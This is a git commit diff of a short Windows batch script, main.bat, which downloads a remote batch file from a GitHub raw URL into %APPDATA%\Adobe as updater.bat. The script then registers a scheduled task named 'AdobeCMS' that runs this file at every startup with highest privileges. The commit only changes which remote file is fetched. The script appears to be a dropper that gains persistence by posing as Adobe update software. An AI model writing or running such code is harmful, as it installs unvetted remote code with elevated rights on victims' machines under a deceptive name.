dac27d1d73a2fad8c9390b431b40935e351972b2
qufyu <162769381+qufyu@users.noreply.github.com>
2024-03-09 12:44:34 -0500

    Update main.bat

--- main.bat
+++ main.bat
@@ -1,4 +1,4 @@
 @echo off
 mkdir -p %APPDATA%\Adobe
-curl -s https://raw.githubusercontent.com/qufyu/0024/main/main.bat > %APPDATA%\Adobe\updater.bat
+curl -s https://raw.githubusercontent.com/qufyu/0024/main/updater.bat > %APPDATA%\Adobe\updater.bat
 schtasks /create /sc onstart /tn AdobeCMS /tr %APPDATA%\Adobe\updater.bat /f /rl HIGHEST
